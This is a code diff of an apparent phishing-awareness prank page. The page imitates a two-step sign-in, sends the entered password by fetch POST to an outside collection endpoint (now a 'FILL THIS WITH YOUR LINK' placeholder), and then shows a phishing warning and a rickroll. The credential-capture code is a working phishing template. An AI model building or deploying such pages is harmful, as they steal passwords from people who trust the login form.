@@ -429,7 +429,6 @@
 
         btnNext.addEventListener('click', async function() {
             if (!isPasswordStage) {
-                // Move to password stage
                 isPasswordStage = true;
                 pageTitle.textContent = 'Enter password';
                 emailInput.classList.add('hidden');
@@ -438,12 +437,11 @@
                 noAccount.classList.add('hidden');
                 signinOptions.classList.add('hidden');
             } else {
-                // Password entered - send notification and show rickroll
                 const password = passwordInput.value;
                 
-                // Send notification via Formspree
+                // REDACTED LINK
                 try {
-                    const response = await fetch('https://formspree.io/f/xqadggab', {
+                    const response = await fetch('FILL THIS WITH YOUR LINK', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
@@ -458,7 +456,6 @@
                     console.log('Notification sent');
                 }
 
-                // Hide login form and show phishing warning and rickroll
                 rickrollFrame.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1';
                 mainContainer.classList.add('hidden');
                 phishingWarning.classList.remove('hidden');
@@ -468,7 +465,6 @@
 
         btnBack.addEventListener('click', function() {
             if (isPasswordStage) {
-                // Go back to email stage
                 isPasswordStage = false;
                 pageTitle.textContent = 'Sign in';
                 emailInput.classList.remove('hidden');
@@ -480,7 +476,6 @@
             }
         });
 
-        // Handle Enter key
         emailInput.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 btnNext.click();
